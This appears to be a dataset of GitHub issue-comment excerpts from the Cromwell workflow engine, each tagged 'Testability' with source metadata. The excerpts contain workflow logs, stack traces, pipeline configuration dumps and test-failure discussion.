/8ee1f938-a92c-48df-a4cc-7a0683413547/workflow.logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef67030.log; Feb 13 11:51:39 gce-cromwell-alpha1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986:2415,test,test,2415,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279542986,1,['test'],['test']
Testability,"3 of the tests have been addressed in #4748, made this issue into a checklist",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-475245556:9,test,tests,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-475245556,1,['test'],['tests']
Testability,"3:04:22.693611455Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt_summary.html""; startTime: '2017-01-13T23:08:18.577755879Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task-rc.txt""; startTime: '2017-01-13T23:12:21.761179493Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt""; startTime: '2017-01-13T23:16:37.083751898Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt""; startTime: '2017-01-13T23:20:40.785907191Z'; labels: {}; projectId: broad-firecloud-benchmark; request:; '@type': type.googleapis.com/google.genomics.v1alpha2.RunPipelineRequest; ephemeralPipeline:; docker:; cmd: /bin/bash /cromwell_root/exec.sh; imageName: broadinstitute/broadmutationcalling_beta:benchmark_1; inputParameters:; - name: __extra_config_gcs_path; - localCopy:; disk: local-disk; path: fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:2138,log,log,2138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['log'],['log']
Testability,3] /home/lichtens/eval-gatk-protected/cromwell-workflow-logs/workflow.8968c364-3623-4242-b39e-228f43f5d4c3.log; java.nio.file.NoSuchFileException: /home/lichtens/eval-gatk-protected/cromwell-workflow-logs/workflow.8968c364-3623-4242-b39e-228f43f5d4c3.log; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.implDelete(UnixFileSystemProvider.java:244); at sun.nio.fs.AbstractFileSystemProvider.delete(AbstractFileSystemProvider.java:103); at java.nio.file.Files.delete(Files.java:1126); at better.files.File.delete(File.scala:602); at cromwell.core.logging.WorkflowLogger$$anonfun$deleteLogFile$1.apply(WorkflowLogger.scala:112); at cromwell.core.logging.WorkflowLogger$$anonfun$deleteLogFile$1.apply(WorkflowLogger.scala:112); at scala.Option.foreach(Option.scala:257); at cromwell.core.logging.WorkflowLogger.deleteLogFile(WorkflowLogger.scala:112); at cromwell.engine.workflow.WorkflowActor$$anonfun$9$$anonfun$applyOrElse$1.apply(WorkflowActor.scala:307); at cromwell.engine.workflow.WorkflowActor$$anonfun$9$$anonfun$applyOrElse$1.apply(WorkflowActor.scala:303); at scala.Option.foreach(Option.scala:257); at cromwell.engine.workflow.WorkflowActor$$anonfun$9.applyOrElse(WorkflowActor.scala:303); at cromwell.engine.workflow.WorkflowActor$$anonfun$9.applyOrElse(WorkflowActor.scala:288); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$$anonfun$handleTransition$1.apply(FSM.scala:606); at akka.actor.FSM$$anonfun$handleTransition$1.apply(FSM.scala:606); at scala.collection.immutable.List.foreach(List.scala:381); at akka.actor.FSM$class.handleTransition(FSM.scala:606); at akka.actor.FSM$class.makeTransition(FSM.scala:688); at cromwell.engine.workflow.WorkflowActor.makeTransition(WorkflowActor.scala:154); at akka.actor.FSM$class.ap,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265750486:1744,log,logging,1744,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265750486,1,['log'],['logging']
Testability,42b47 | callCaching:hashes:runtime attribute:docker | test.hello | NULL | 1 | 66E19F14150E71B0E42CA8557A69C5F9 | 2018-11-21 15:09:37.710000 | string |; | 4775 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hashes:runtime attribute:failOnStderr | test.hello | NULL | 1 | 68934A3E9455FA72420237EB05902327 | 2018-11-21 15:09:37.710000 | string |; | 4735 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | true | 2018-11-21 15:09:09.839000 | boolean |; | 4742 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hit | test.hello | NULL | 1 | false | 2018-11-21 15:09:10.555000 | boolean |; | 4741 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:causedBy[] | test.hello | NULL | 1 | NULL | 2018-11-21 15:09:10.486000 | NULL |; | 4740 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:causedBy[0]:message | test.hello | NULL | 1 | The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.486000 | string |; | 4739 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:hitFailures[0]:2f58eee9-1b0f-4436-a4ad-48eb305655e9\:test.hello\:-1[2043552529]:message | test.hello | NULL | 1 | [Attempted 1 time(s)] - NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 677F4FE44C747A7E) | 2018-11-21 15:09:10.485000 | string |; | 4736 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Hit: 2f58eee9-1b0f-4436-a4ad-48eb305655e9:test.hello:-1 | 2018-11-21 15:09:09.839000 | string |; | 4743 | 02306258-436a-4372-ab54-2dcd83c42b47 | callCaching:result | test.hello | NULL | 1 | Cache Miss | 2018-11-21 15:09:10.555000 | string |; | 4759 | 02306258-436a-4372-ab54-2dcd83c42b47 | callRoot | test.hello | NULL | 1 | s3://s4-somaticgenomicsrd-val,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029:1092,test,test,1092,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440701029,1,['test'],['test']
Testability,"4c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: BackgroundConfigAsyncJobExecutionActor [814c47aa:aggregate_mafs_workflow.aggregate_mafs:NA:1] Status change from - to SharedFileSystemRunStatus(false); [2017-01-20 09:33:07,55] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: BackgroundConfigAsyncJobExecutionActor [814c47aa:aggregate_mafs_workflow.aggregate_mafs:NA:1] Status change from SharedFileSystemRunStatus(false) to SharedFileSystemRunStatus(true); [2017-01-20 09:33:07,58] [info] Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-910401033] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:4661,log,log-dead-letters,4661,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['log'],['log-dead-letters']
Testability,"532462. The first failure was a docker test, and looking at this more closely something seems to have gone awry pulling the Docker image. Our build scripts should pre-pull `ubuntu:latest` and normally this takes about 10 seconds and produces a nice success message. In this run the Docker image pull took more than 43 seconds and the success message appears to be cut off:. ```; Pulling repository docker.io/library/ubuntu; age for ubuntu:latest; ```. The Docker test looks like it's going fine until it's time to actually run a call, at which point there are no log messages for 16 seconds, and when the log message does arrive it seems to indicate a timeout:. ```; [INFO] [03/03/2016 23:43:02.128] [test-system-akka.actor.default-dispatcher-2] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Starting.; [WARN] [03/03/2016 23:43:18.664] [test-system-akka.actor.default-dispatcher-4] [akka://test-system/system/IO-TCP/selectors/$a/1] received dead letter from Actor[akka://test-system/user/IO-HTTP/group-0/1#-1001288108]: Write(ByteString(),spray.io.SslTlsSupport$WriteChunkAck$@22a4ed01); ```. There's another 13 second hang shortly thereafter:. ```; [INFO] [03/03/2016 23:43:19.002] [test-system-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:1185,test,test-system,1185,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,4,['test'],['test-system']
Testability,56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; labels: {}; logging:; gcsPath: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task.log; outputs:; VEP_Task-rc.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/VEP_Task-rc.txt; df.log.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt; dstat.log.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt; variant_effect_output.txt: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt; variant_effect_output.txt_summary.html: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 0; disks: []; minimumCpuCores: 0; minimumRamGb: 0; noAddress: false; preemptible: false; zones: []; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/compute; runtimeMetadata:; '@type': type.googleapis.com/google.genomics.v1alpha2.RuntimeMetadata; computeEngine:; diskNames:; - local-disk-16952835813372226956; instanceName: ggp-16952835813372226956; machineType: us-central1-b/n1-standard-2; zone: us-central1-b;,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:5062,log,log,5062,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['log'],['log']
Testability,"5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq/ref-transcripts.gtf.db"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq/ref-transcripts.gtf.db"",; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/rnaseq"",; ""secondaryFiles"": [],; ""basename"": ""ref-transcripts.gtf.db"",; ""class"": ""File"",; ""nameroot"": ""ref-transcripts.gtf""; }; ],; ""basename"": ""ref-transcripts.gtf"",; ""class"": ""File"",; ""nameroot"": ""ref-transcripts""; },; ""reference__fasta__base"": {; ""nameext"": "".fa"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa"",; ""size"": 37196,; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq"",; ""secondaryFiles"": [; {; ""nameext"": "".fai"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa.fai"",; ""path"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq/hg19.fa.fai"",; ""dirname"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a1b9e6fd2e1/call-qc_to_rec/bcbiodata/test_bcbio_cwl/testdata/genomes/hg19/seq"",; ""secondaryFiles"": [],; ""basename"": ""hg19.fa.fai"",; ""class"": ""File"",; ""nameroot"": ""hg19.fa""; },; {; ""nameext"": "".dict"",; ""location"": ""/cromwell_root/tj-bcbio-papi/main-rnaseq.cwl/6c75cc7c-5515-45e0-9e5b-9a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:9740,test,testdata,9740,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['test'],['testdata']
Testability,7); at org.scalatest.Suite.run$(Suite.scala:1129); at cromwell.core.TestKitSuite.org$scalatest$BeforeAndAfterAll$$super$run(TestKitSuite.scala:16); at org.scalatest.BeforeAndAfterAll.liftedTree1$1(BeforeAndAfterAll.scala:213); at org.scalatest.BeforeAndAfterAll.run(BeforeAndAfterAll.scala:210); at org.scalatest.BeforeAndAfterAll.run$(BeforeAndAfterAll.scala:208); at cromwell.core.actor.RobustClientHelperSpec.org$scalatest$FlatSpecLike$$super$run(RobustClientHelperSpec.scala:14); at org.scalatest.FlatSpecLike.$anonfun$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.core.actor.RobustClientHelperSpec.run(RobustClientHelperSpec.scala:14); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitV,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054:3840,Test,TestRunner,3840,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054,2,['Test'],['TestRunner']
Testability,"7-01-20 09:31:16,03] [info] Metadata summary refreshing every 2 seconds.; [2017-01-20 09:31:16,06] [info] 1 new workflows fetched; [2017-01-20 09:31:16,06] [info] WorkflowManagerActor Starting workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46; [2017-01-20 09:31:16,06] [info] WorkflowManagerActor Successfully started WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46; [2017-01-20 09:31:16,06] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2017-01-20 09:31:16,30] [info] MaterializeWorkflowDescriptorActor [814c47aa]: Call-to-Backend assignments: aggregate_mafs_workflow.aggregate_mafs -> Local; [2017-01-20 09:31:16,48] [info] WorkflowExecutionActor-814c47aa-9d11-4c81-a08c-f2b77c002b46 [814c47aa]: Starting calls: aggregate_mafs_workflow.aggregate_mafs:NA:1; [2017-01-20 09:31:16,69] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: python /src/Merge_MAFs.py --suffix test ACC /root/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs/execution/wdlarray-8012c813f9ee08681a0b1fb427a70b0d.tmp; [2017-01-20 09:31:16,70] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: executing: docker run --rm -v /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs:/root/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs -i broadgdac/aggregate_mafs:2 /bin/bash /root/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs/execution/script; [2017-01-20 09:31:16,71] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: command: ""/bin/bash"" ""/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs/execution/script.submit""; [2017-01-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:2402,test,test,2402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['test'],['test']
Testability,7191Z'; labels: {}; projectId: broad-firecloud-benchmark; request:; '@type': type.googleapis.com/google.genomics.v1alpha2.RunPipelineRequest; ephemeralPipeline:; docker:; cmd: /bin/bash /cromwell_root/exec.sh; imageName: broadinstitute/broadmutationcalling_beta:benchmark_1; inputParameters:; - name: __extra_config_gcs_path; - localCopy:; disk: local-disk; path: fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt; name: variant_effect_output.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt_summary.html; name: variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 10; disks:; - mountPoint: /cromwell_root; name: local-disk; sizeGb: 31; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; zones:; - us-central1-b; - us-central1-c; - us-central1-f; pipelineArgs:; clientId: ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; __extra_config_gcs_path: gs://cromwell-auth-broad-firecloud-benchmark/04b3f189-18f3-47b3-972c-0e59d2a56174_auth.json; exec: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/exec.sh; mutectMergedRawVCF-0: gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:3183,log,log,3183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['log'],['log']
Testability,750); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:373); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:410); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.scala:379); at org.scalatest.SuperEngine.runTestsImpl(Engine.scala:461); at org.scalatest.FlatSpecLike.runTests(FlatSpecLike.scala:1750); at org.scalatest.FlatSpecLike.runTests$(FlatSpecLike.scala:1749); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.runTests(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.Suite.run(Suite.scala:1147); at org.scalatest.Suite.run$(Suite.scala:1129); at cromwell.core.TestKitSuite.org$scalatest$BeforeAndAfterAll$$super$run(TestKitSuite.scala:16); at org.scalatest.BeforeAndAfterAll.liftedTree1$1(BeforeAndAfterAll.scala:213); at org.scalatest.BeforeAndAfterAll.run(BeforeAndAfterAll.scala:210); at org.scalatest.BeforeAndAfterAll.run$(BeforeAndAfterAll.scala:208); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.org$scalatest$FlatSpecLike$$super$run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.FlatSpecLike.$anonfun$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.run(HealthMonitorServiceActorSpec.scala:20); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunn,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:3370,Test,TestKitSuite,3370,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,2,['Test'],['TestKitSuite']
Testability,"79] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: BackgroundConfigAsyncJobExecutionActor [814c47aa:aggregate_mafs_workflow.aggregate_mafs:NA:1] Status change from - to SharedFileSystemRunStatus(false); [2017-01-20 09:33:07,55] [info] BackgroundConfigAsyncJobExecutionActor [814c47aaaggregate_mafs_workflow.aggregate_mafs:NA:1]: BackgroundConfigAsyncJobExecutionActor [814c47aa:aggregate_mafs_workflow.aggregate_mafs:NA:1] Status change from SharedFileSystemRunStatus(false) to SharedFileSystemRunStatus(true); [2017-01-20 09:33:07,58] [info] Message [cromwell.subworkflowstore.SubWorkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-910401033] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at 